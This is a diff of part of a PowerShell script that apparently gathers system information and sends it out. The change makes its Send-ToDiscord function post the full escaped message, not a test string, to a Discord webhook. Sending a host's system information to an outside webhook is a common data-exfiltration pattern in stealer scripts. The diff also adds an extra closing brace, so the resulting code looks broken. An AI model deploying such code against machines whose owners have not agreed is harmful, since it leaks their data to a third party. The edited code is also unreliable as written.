@@ -421,19 +421,24 @@ Write-Host "Length of SystemInfo: $($SystemInfo.Length)"
 function Send-ToDiscord {
     param ($Message)
 
-    # Debug: Print the first 100 characters of the message to the console
-    Write-Host "Send-ToDiscord called. Message preview (first 100 chars): $($Message.Substring(0, [Math]::Min(100, $Message.Length)))"
+    # Debug: Output the message length to the console
+    Write-Host "Sending message to Discord. Length: $($Message.Length)"
 
-    # Construct a basic payload
-    $payload = @{ content = "Test message from PowerShell webhook" } | ConvertTo-Json
+    # Escape special characters in the message for JSON compatibility
+    $escapedMessage = $Message -replace '\\', '\\\\' -replace '"', '\"' -replace '\n', '\\n' -replace '\r', ''
+
+    # Construct the JSON payload
+    $payload = @{ content = "```$escapedMessage```" } | ConvertTo-Json
 
     try {
+        # Send the message to Discord
         Invoke-RestMethod -Uri $DiscordWebhookUrl -Method Post -ContentType 'application/json' -Body $payload
-        Write-Host "Test message sent to Discord successfully."
+        Write-Host "Message sent to Discord successfully."
     } catch {
-        Write-Error "Failed to send test message to Discord."
+        Write-Error "Failed to send message to Discord."
         Write-Error $_.Exception.Message
     }
+}
 }
 
 # Main Script: Gather System Information
